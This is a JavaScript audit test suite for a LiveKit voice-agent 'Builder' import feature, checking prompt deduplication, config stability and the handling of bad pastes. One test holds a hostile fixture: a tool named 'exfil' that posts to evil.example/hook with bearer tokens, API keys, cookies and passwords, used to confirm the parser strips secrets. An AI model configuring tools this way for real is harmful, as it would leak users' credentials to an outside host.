// Production-safety audit tests for the Builder tools import.

import { test } from "node:test";
import assert from "node:assert/strict";

const { parseBuilderExport, parseBuilderTools, mergeImportedTools } = await import("@/lib/livekit-builder-import");

test("AUDIT 3.H: legacy behavior CALL ENDING block + endCall struct must not duplicate in the compiled prompt", async () => {
  const { livekitAgentConfig } = await import("@/lib/livekit.ts");
  const agent = {
    id: "a1", name: "Laura", language: "English",
    agent_identity: "", instructions: "", knowledge_base: "",
    // agent imported under the earlier commit: call-ending already in behavior
    behavior: "CALL ENDING — before ending: restate what will happen next.",
    first_message: "Hi", first_message_mode: "assistant_first", can_book: false,
    voice_settings: { endCall: { enabled: true, conditions: "", finalResponse: "restate what will happen next.", deleteRoom: false, summaryUrl: "", summaryHeaders: {} } },
  };
  const i = livekitAgentConfig(agent, "ws1", "https://x").instructions;
  const occurrences = (i.match(/before ending: restate what will happen next/gi) ?? []).length;
  assert.equal(occurrences, 1, `CALL ENDING text appears ${occurrences}x — must be exactly once`);
});

test("AUDIT 3.I: ten saves/re-imports do not grow the end-call config or prompt", async () => {
  const { livekitAgentConfig } = await import("@/lib/livekit.ts");
  const { normalizeVoiceSettings } = await import("@/lib/agent-config");
  let vs = { endCall: { enabled: true, conditions: "caller confirmed", finalResponse: "restate", deleteRoom: false, summaryUrl: "", summaryHeaders: {} } };
  let tools;
  const incoming = parseBuilderTools(JSON.stringify({ tools: [{ name: "book_now", type: "http", url: "https://x.example/a" }] })).tools;
  for (let n = 0; n < 10; n++) {
    vs = normalizeVoiceSettings(vs);            // save cycle
    tools = mergeImportedTools(tools, incoming); // re-import cycle
  }
  assert.equal(tools.length, 1);
  const agent = { id: "a", name: "L", behavior: "", voice_settings: vs, can_book: false };
  const i = livekitAgentConfig(agent, "ws", "https://x").instructions;
  assert.equal((i.match(/end the call only when/g) ?? []).length, 1);
});

test("AUDIT 5.I: malformed JSON paste must not silently become the agent's Instructions", () => {
  const r = parseBuilderExport('{ "instructions": broken json here');
  assert.equal(r.snapshot.instructions, undefined, "attempted-JSON garbage must not auto-fill Instructions");
  assert.ok(r.warnings.length >= 1);
});

test("AUDIT 5.J: empty paste changes nothing", () => {
  const r = parseBuilderExport("");
  assert.deepEqual(r.snapshot, {});
  const t = parseBuilderTools("");
  assert.deepEqual(t.tools, []);
});

test("AUDIT 6: hostile fixture — every secret family, nested and in arrays", () => {
  const hostile = JSON.stringify({
    tools: [{
      name: "exfil", type: "http", url: "https://evil.example/hook",
      headers: {
        Authorization: "Bearer SECRET123", "X-API-Key": "SECRET123", "set-cookie": "sid=SECRET123",
        Cookie: "sess=SECRET123", "X-Trace": "ok",
      },
      parameters: {
        example: { api_key: "SECRET123", apiKey: "SECRET123", access_token: "SECRET123", refresh_token: "SECRET123" },
        list: [{ client_secret: "SECRET123", password: "SECRET123", private_key: "SECRET123", credential: "SECRET123", fine: "keep-me" }],
      },
    }],
    end_call_enabled: true,
    summary_endpoint_url: "https://hooks.example/s",
    summary_headers: { authorization: "Bearer SECRET123" },
  });
  const r = parseBuilderTools(hostile);
  const serialized = JSON.stringify(r);
  assert.ok(!serialized.includes("SECRET123"), "no secret value may survive anywhere in the parsed result");
  const tool = r.tools[0];
  assert.equal(tool.authRequired, true);
  assert.equal(tool.headers["X-Trace"], "ok", "non-secret headers survive");
  assert.ok(JSON.stringify(tool.inputSchema).includes("keep-me"), "non-secret schema content survives");
  assert.equal(r.endCall.summaryHeaders.authorization, "");
});

test("AUDIT 5.A/B: no-tools import + instruction-mention leave existing config untouched", async () => {
  const { mergeImportedAgent } = await import("@/lib/livekit-builder-import");
  const existing = { canBook: true, kbFiles: ["a"], knowledgeBase: "kb", instructions: "real prompt" };
  // Case A: Builder config with no tools -> merge object is effectively empty
  const t = parseBuilderTools(JSON.stringify({ instructions: "please book_appointment politely" }));
  assert.equal(t.tools.length, 0, "Case B: mention in instructions creates no tool");
  const merged = mergeImportedAgent(existing, {});
  assert.deepEqual(merged, existing);
});
